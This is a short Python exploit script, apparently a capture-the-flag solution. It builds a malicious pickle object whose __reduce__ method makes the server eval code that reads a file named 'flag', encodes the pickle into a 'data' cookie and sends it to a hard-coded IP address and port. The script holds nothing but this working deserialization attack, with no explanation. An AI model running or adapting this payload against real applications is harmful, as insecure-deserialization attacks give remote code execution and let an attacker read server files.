import pickle
import base64
import requests

class Exploit(object) :
	def __reduce__(self):
		return eval, ("open ('flag', 'r'). read ()", )

def sendPayload (p) :
	print (base64.urlsafe_b64encode (p))
	headers = {"Cookie": "data=" + base64.urlsafe_b64encode(p).decode()}
	t = requests.get ("http://34.107.71.117:32409/dashboard",headers=headers)
	print(t.text)
	
sendPayload(pickle.dumps(Exploit(),protocol=2))
